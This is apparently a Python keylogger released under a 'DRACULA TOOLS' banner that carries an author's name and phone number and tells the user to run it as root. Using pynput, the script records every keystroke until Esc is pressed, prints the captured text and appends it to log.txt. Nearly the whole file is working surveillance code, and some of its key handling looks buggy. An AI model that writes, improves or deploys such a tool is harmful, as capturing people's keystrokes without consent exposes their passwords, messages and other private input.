RED = "\33[91m"
BLUE = "\33[94m"
GREEN = "\033[32m"
YELLOW = "\033[93m"
PURPLE = '\033[0;35m'
CYAN = "\033[36m"
END = "\033[0m"
banner=f"""{YELLOW}
#  ██████╗ ██████╗  █████╗  ██████╗██╗   ██╗██╗      █████╗ {CYAN}
#  ██╔══██╗██╔══██╗██╔══██╗██╔════╝██║   ██║██║     ██╔══██╗
#  ██║  ██║██████╔╝███████║██║     ██║   ██║██║     ███████║ {GREEN}
#  ██║  ██║██╔══██╗██╔══██║██║     ██║   ██║██║     ██╔══██║    {YELLOW}
#  ██████╔╝██║  ██║██║  ██║╚██████╗╚██████╔╝███████╗██║  ██║
#  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝ TOOLS {PURPLE}
#            Author:MAIMO HARRIS Contact:+237680226898        
{END}"""
print(banner)
print("You Must Run this Tool as Root\n\n")

from pynput import keyboard
keys=[]

def on_press(key):
    try:
        keys.append(key.char)
    except AttributeError:
        # If it's a key object (special key)
        if key == key.space:
            keys.append(' ')
        elif key == key.enter:
            keys.append('\n')
        elif key == key.tab:
            keys.append('\t')
        elif key == key.backspace:
            keys.pop()
        elif key == key.esc:
            keys.append(' [ESC]')
        else:
            keys.append(f'[{str(key).replace("key.", "")}]')

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

loged_data="".join(keys)
print(loged_data)
with open('log.txt','a') as log_file:
    log_file.write(loged_data)
    log_file.close()

